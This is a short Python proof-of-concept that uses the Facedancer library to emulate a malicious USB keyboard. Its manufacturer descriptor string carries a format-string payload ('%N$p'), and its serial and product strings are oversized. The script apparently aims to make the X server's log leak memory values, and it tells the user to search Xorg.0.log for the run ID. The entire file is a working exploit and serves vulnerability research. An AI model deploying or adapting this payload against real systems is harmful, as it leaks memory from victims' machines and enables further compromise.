#!/usr/bin/env python3
# pylint: disable=unused-wildcard-import, wildcard-import, logging-fstring-interpolation
import os
import logging
import uuid
from facedancer import main
from facedancer.devices.keyboard import USBKeyboardDevice

run_id = uuid.uuid4().bytes.hex()
idx = int(os.environ.get("RBPIDX", 46))

payload = f"[[<{run_id}> param index {idx}: %{idx}$p ]]"
serial = "A"*48
product = "Z"*120
manu = payload

# create the device and connect
DEVICE = USBKeyboardDevice()
DEVICE.serial_number_string = serial
DEVICE.manufacturer_string = manu
DEVICE.product_string = product
DEVICE.product_id = 0x1337
DEVICE.vendor_id = 0x1337

main(DEVICE)
logging.info(f"Search for RUN_ID {run_id} in /var/log/Xorg.0.log to find the leaked value")
